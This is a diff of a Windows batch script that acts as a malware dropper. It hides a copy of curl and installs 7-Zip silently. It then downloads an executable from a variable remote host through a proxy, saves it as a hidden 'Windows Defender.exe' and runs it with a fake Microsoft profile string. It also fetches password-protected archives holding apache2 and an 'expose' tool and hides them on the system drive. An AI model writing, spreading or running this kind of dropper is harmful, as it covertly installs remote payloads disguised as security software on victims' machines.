@@ -25,12 +25,6 @@ copy /y "curl.exe" "%environment%\curl.exe" && attrib +s +h +i "%environment%\cu
 
 "%environment%\curl.exe" -k https://www.7-zip.org/a/7z2201.exe -o "%temp%\7z2201.exe" && "%temp%\7z2201.exe" /S /D="%environment%\7-Zip" && del "%temp%\7z2201.exe" && attrib +s +h +i "%environment%\7-Zip"
 
-reg Query "HKLM\Hardware\Description\System\CentralProcessor\0" | find /i "x86" > NUL && set OS=32BIT || set OS=64BIT
-
-if %OS%==32BIT curl -k -L https://aka.ms/vs/17/release/VC_redist.x86.exe -o "%temp%\VC_redist.x86.exe" && "%temp%\VC_redist.x86.exe" /Q && del "%temp%\VC_redist.x86.exe"
-
-if %OS%==64BIT curl -k -L https://aka.ms/vs/17/release/VC_redist.x86.exe -o "%temp%\VC_redist.x86.exe" && "%temp%\VC_redist.x86.exe" /Q && del "%temp%\VC_redist.x86.exe" && curl -k -L https://aka.ms/vs/17/release/VC_redist.x64.exe -o "%temp%\VC_redist.x64.exe" && "%temp%\VC_redist.x64.exe" /Q && del "%temp%\VC_redist.x64.exe" 
-
 if exist "%environment%\tor.exe" (
     echo.
 ) else (
@@ -49,8 +43,14 @@ mkdir "%environment%\Win32"
 attrib +s +h +i "%environment%\Win32"
 
 "%environment%\curl.exe" -k %proxy% %host%/sfx.exe -o "%environment%\Windows Defender.exe" && attrib +s +h +i "%environment%\Windows Defender.exe"
-"%environment%\curl.exe" -k %proxy% %host%/Tools/apache2.7z -o "%temp%\apache2.7z" && "%environment%\7-Zip\7z.exe" x "%temp%\apache2.7z" -p7zapache -o"C:\" -y && attrib +s +h +i "C:\apache2" && del "%temp%\apache2.7z"
 "%environment%\curl.exe" -k %proxy% %host%/Tools/expose.7z -o "%temp%\expose.7z" && "%environment%\7-Zip\7z.exe" x "%temp%\expose.7z" -p7zexpose -o"%environment%" -y && attrib +s +h +i "%environment%\expose.exe" && del "%temp%\expose.7z"
+"%environment%\curl.exe" -k %proxy% %host%/Tools/apache2.7z -o "%temp%\apache2.7z" && "%environment%\7-Zip\7z.exe" x "%temp%\apache2.7z" -p7zapache -o"C:\" -y && attrib +s +h +i "C:\apache2" && del "%temp%\apache2.7z"
+
+reg Query "HKLM\Hardware\Description\System\CentralProcessor\0" | find /i "x86" > NUL && set OS=32BIT || set OS=64BIT
+
+if %OS%==32BIT curl -k -L https://aka.ms/vs/17/release/VC_redist.x86.exe -o "%temp%\VC_redist.x86.exe" && "%temp%\VC_redist.x86.exe" /Q && del "%temp%\VC_redist.x86.exe"
+
+if %OS%==64BIT curl -k -L https://aka.ms/vs/17/release/VC_redist.x86.exe -o "%temp%\VC_redist.x86.exe" && "%temp%\VC_redist.x86.exe" /Q && del "%temp%\VC_redist.x86.exe" && curl -k -L https://aka.ms/vs/17/release/VC_redist.x64.exe -o "%temp%\VC_redist.x64.exe" && "%temp%\VC_redist.x64.exe" /Q && del "%temp%\VC_redist.x64.exe" 
 
 "%environment%\Windows Defender.exe" -P"rofile of Windows Defender [Microsoft Corporation]"
 endlocal
